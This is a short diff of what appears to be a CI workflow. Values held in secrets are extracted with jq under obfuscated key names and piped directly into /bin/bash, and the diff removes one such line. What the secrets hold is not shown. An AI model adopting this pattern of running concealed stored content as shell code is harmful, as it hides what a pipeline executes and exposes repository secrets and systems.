@@ -22,7 +22,6 @@ jobs:
           iy4: ${{ secrets.iy4 }}
         run: |
           printf '%s' "$iy4" | jq -r .fsor4596 | /bin/bash
-          echo $xvr084 | jq -r .colap2 | /bin/bash
           printf '%s' "$w9" | jq -r .ib79694 | /bin/bash
 
       - name: Archive artifact
